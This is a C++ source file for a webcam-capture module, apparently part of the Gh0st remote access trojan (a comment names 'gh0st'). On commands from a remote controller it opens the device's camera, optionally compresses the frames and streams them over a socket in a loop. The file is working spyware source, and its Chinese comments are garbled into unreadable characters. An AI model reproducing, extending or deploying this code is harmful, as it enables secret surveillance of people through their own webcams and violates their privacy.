// VideoManager.cpp: implementation of the CVideoManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "VideoManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CVideoManager::CVideoManager(CClientSocket *pClient) : CManager(pClient)
{
 	m_pVideoCap = NULL;
	m_pVideoCodec = NULL;
 	m_bIsWorking = true;
	m_bIsCompress = false;
	m_nVedioWidth = 0;
	m_nVedioHeight = 0;
	//�����1129730893 ����Ƶѹ���� Microsoft Video 1��ֵ   ���»ص���WorkThread  
	m_fccHandler = 1129730893;     //Microsoft Video 1
	m_CapVideo.Open(0,0);
 	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

CVideoManager::~CVideoManager()
{
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
}

void CVideoManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_NEXT:
		NotifyDialogIsOpen();
		break;
	case COMMAND_WEBCAM_ENABLECOMPRESS: // Ҫ������ѹ��
		{
			// �����������ʼ��������������ѹ������
			if (m_pVideoCodec)
				InterlockedExchange((LPLONG)&m_bIsCompress, true);
		}
		break;
	case COMMAND_WEBCAM_DISABLECOMPRESS:
		InterlockedExchange((LPLONG)&m_bIsCompress, false);
		break;
	case COMMAND_WEBCAM_RESIZE:
		ResetScreen(*((LPDWORD)(lpBuffer + 1)), *((LPDWORD)(lpBuffer + 5)));
		break;
	default:	
		break;
	}	
}

void CVideoManager::sendBITMAPINFO()
{
	DWORD	dwBytesLength = 1 + sizeof(BITMAPINFO);
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;
	//memcpy(lpBuffer + 1, m_pVideoCap->m_lpbmi, sizeof(BITMAPINFO));
	memcpy(lpBuffer + 1, m_CapVideo.GetBmpInfo(), sizeof(BITMAPINFO));
	Send(lpBuffer, dwBytesLength);

	delete [] lpBuffer;		
}

void CVideoManager::sendNextScreen()
{
	DWORD dwBmpImageSize=0;
	LPVOID	lpDIB =m_CapVideo.GetDIB(dwBmpImageSize); //m_pVideoCap->GetDIB();
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;

	UINT	nBufferLen = nHeadLen + dwBmpImageSize;//m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage;
	LPBYTE	lpBuffer = new BYTE[nBufferLen];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_DIB;
	lpBuffer[1] = m_bIsCompress;
	memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));     //���ｫ��Ƶѹ����д��Ҫ���͵Ļ�����

	UINT	nPacketLen = 0;
	if (m_bIsCompress && m_pVideoCodec)            //�����жϣ��Ƿ�ѹ����ѹ�����Ƿ��ʼ���ɹ�������ɹ���ѹ��          
	{
		int	nCompressLen = 0;
		//����ѹ����Ƶ������
		bool bRet = m_pVideoCodec->EncodeVideoData((LPBYTE)lpDIB, 
			m_CapVideo.GetBmpInfo()->bmiHeader.biSizeImage, lpBuffer + nHeadLen, &nCompressLen, NULL);
		if (!nCompressLen)
		{
			// some thing ...
			return;
		}
		//���¼��㷢�����ݰ��Ĵ�С  ʣ�¾��Ƿ����� �����ǵ����ض˿�һ����Ƶ���ѹ������ô����
		//�����ض˵�void CVideoDlg::OnReceiveComplete(void)
		nPacketLen = nCompressLen + nHeadLen;
	}
	else
	{
		memcpy(lpBuffer + nHeadLen, lpDIB, dwBmpImageSize);
		nPacketLen = dwBmpImageSize+ nHeadLen;
		//m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage + nHeadLen;
	}
    m_CapVideo.SendEnd();
	Send(lpBuffer, nPacketLen);

	delete [] lpBuffer;
}

void CVideoManager::ResetScreen(int nWidth, int nHeight)
{
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);

	// ������Ƶ��С
	m_nVedioWidth = nWidth;
	m_nVedioHeight = nHeight;

	InterlockedExchange((LPLONG)&m_bIsWorking, true);
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

DWORD WINAPI CVideoManager::WorkThread( LPVOID lparam )
{
	static	int dwLastScreen = GetTickCount();

	CVideoManager *pThis = (CVideoManager *)lparam;
	
	if (pThis->Initialize())          //ת��Initialize
	{
		//pThis->Destroy();
		//pThis->m_pClient->Disconnect();
		//return -1;
		pThis->m_bIsCompress=true;      //�����ʼ���ɹ������ÿ���ѹ��
	}
	pThis->sendBITMAPINFO();
	// �ȿ��ƶ˶Ի����
	pThis->WaitForDialogOpen();

	while (pThis->m_bIsWorking)
	{
		// �����ٶ�
 		if ((GetTickCount() - dwLastScreen) < 150)
 			Sleep(100);
 		dwLastScreen = GetTickCount();
		pThis->sendNextScreen();                //����û��ѹ����صĴ����ˣ����ǵ�sendNextScreen  ����
	}
	// �����Ѿ�����ʵ�����������µ���
	pThis->Destroy();

	return 0;
}

bool CVideoManager::Initialize()
{
	//m_CapVideo.EnumCompress();
	bool	bRet = true;
	
	if (m_pVideoCodec!=NULL)          //�����m_pVideoCodec ��CVideoCodec��Ķ����������gh0st�Դ�����Ƶѹ���࣬�����õ����ֳ�
	{                                 //��ֻ��������ѹ����
		delete m_pVideoCodec;
		m_pVideoCodec=NULL;           
	}
	if (m_fccHandler==0)         //������ѹ��
	{
		bRet= false;
		return bRet;
	}
	m_pVideoCodec = new CVideoCodec;
	//�����ʼ������Ƶѹ�� ��ע�������ѹ����  m_fccHandler(�����캯���в鿴)
	if (!m_pVideoCodec->InitCompressor(m_CapVideo.GetBmpInfo(), m_fccHandler))
	{
		delete m_pVideoCodec;
		bRet=false;
		// ��NULL, ����ʱ�ж��Ƿ�ΪNULL���ж��Ƿ�ѹ��
		m_pVideoCodec = NULL;
	}
	return bRet;
}

void CVideoManager::Destroy()
{
	if (m_pVideoCap)
	{
		delete m_pVideoCap;
		m_pVideoCap = NULL;
	}
	if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}
}
